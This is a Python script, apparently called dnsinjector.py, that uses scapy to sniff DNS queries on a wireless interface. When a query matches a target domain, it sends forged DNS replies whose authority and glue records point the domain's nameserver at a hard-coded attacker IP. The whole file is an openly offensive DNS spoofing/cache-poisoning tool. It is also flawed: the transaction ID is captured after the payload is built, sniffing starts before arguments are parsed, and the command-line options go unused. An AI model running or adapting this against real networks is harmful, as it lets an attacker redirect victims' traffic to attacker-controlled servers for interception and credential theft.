import sys
import scapy.all as scapy


ip = scapy.get_if_list()

print(ip)

interface = "wlan0"
hostnames = None
src_ip = None
src_port = None
dst_ip = None
dst_port = None
txid = None
attacker_ip = "10.0.0.230"
domain_to_poision = 'example.com'


def process_packet(packet):
    # Check if the packet has a DNS layer
    if scapy.DNS in packet:
        
        dns_layer = packet[scapy.DNS]
        txid = dns_layer.id
        src_ip = packet[scapy.IP].src
        dst_ip = packet[scapy.IP].dst
        
        # Segments of a packet
        if scapy.TCP in packet:
            src_port = packet[scapy.TCP].sport
            dst_port = packet[scapy.TCP].dport
        elif scapy.UDP in packet:
            src_port = packet[scapy.UDP].sport
            dst_port = packet[scapy.UDP].dport
            
            
        #  filter particular packet
        
        if dns_layer.qr == 0:
            query = dns_layer.qd.qname.decode('utf-8')
            
            if domain_to_poision in query:
                print(f"DNS request: {dns_layer.show()}")
                print(src_ip, src_port,dst_ip,dst_port,txid)
                
                send_packet(src_ip=dst_ip, dst_ip=src_ip, dst_port=src_port, payload=payload)
            else:
                pass
        
def dns_payload():
    payload = scapy.DNS(
        id        = txid,
        qr        = 1,
        # opcode    = QUERY,
        aa        = 1,
        tc        = 0,
        rd        = 1,
        ra        = 1,
        z         = 0,
        ad        = 0,
        cd        = 0,
        # rcode     = ok,
        qdcount   = 1,
        ancount   = 0,
        nscount   = 1,
        arcount   = 1
    )
    
    payload.qd = scapy.DNSQR(qname = domain_to_poision, qtype= "A", qclass = "IN")
    payload.ns = scapy.DNSRR(rrname = domain_to_poision, type = "NS", rdata = f"ns1.{domain_to_poision}", ttl = 84600)
    payload.ar = scapy.DNSRR(rrname = f"ns1.{domain_to_poision}", type = "A", ttl = 604800, rdata = attacker_ip)
    
    
    return payload
        
        
payload = dns_payload()

def send_packet(src_ip, dst_ip, dst_port, payload):
    ip_packet = scapy.IP(src = src_ip, dst = dst_ip)
    udp_segment = scapy.UDP(dport = dst_port)
    final_packet = ip_packet/udp_segment/payload
    scapy.send(final_packet)


    
    
scapy.sniff(iface = interface, filter = "ip",prn=process_packet)




if __name__ == "__main__":
    
    if (len(sys.argv) == 2) or ((len(sys.argv) == 4)) or (len(sys.argv) > 5):
        print("Usage: dnsinjector.py [-i interface] [-h hostnames]")
        
    else:
        for i in range(1,len(sys.argv)):
           if sys.argv[i] == "-h":
               if sys.argv[i + 1] != "-i":
                    hostnames = sys.argv[i + 1]
               else:
                   print("Usage: dnsinjector.py [-i interface] [-h hostnames]")
                   sys.exit(1)
           elif sys.argv[i] == "-i":
               if sys.argv[i + 1] != "-h":
                    interface = sys.argv[i + 1]
               else:
                   print("Usage: dnsinjector.py [-i interface] [-h hostnames]")
                   sys.exit(1)
                
                